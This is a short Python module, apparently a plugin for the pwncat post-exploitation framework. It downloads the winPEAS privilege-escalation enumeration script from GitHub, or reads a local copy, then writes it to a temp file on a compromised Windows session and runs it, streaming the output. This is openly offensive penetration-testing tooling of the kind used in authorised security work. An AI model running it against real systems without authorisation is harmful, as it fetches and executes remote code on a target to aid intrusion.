from requests import get

import pwncat
from pwncat.modules.peas import PeassModule, mktemp, stream
from pwncat.platform import Windows
from pwncat.subprocess import PIPE, STDOUT


class Module(PeassModule):

    PLATFORM = [Windows]

    winpeas_lnk = "https://github.com/carlospolop/PEASS-ng/raw/master/winPEAS/winPEASbat/winPEAS.bat"

    def enumerate(self, session: "pwncat.manager.Session", source: str):

        if source:
            src = open(source, "r")
            winpeas = src.read()
            src.close()

        else:
            winpeas = get(self.winpeas_lnk, allow_redirects=True).text

        dst = mktemp(session, mode="w", suffix="bat")
        dst.write(winpeas)
        dst.close()

        proc = session.platform.Popen(dst.name, stdout=PIPE, stderr=STDOUT)

        stream(proc)
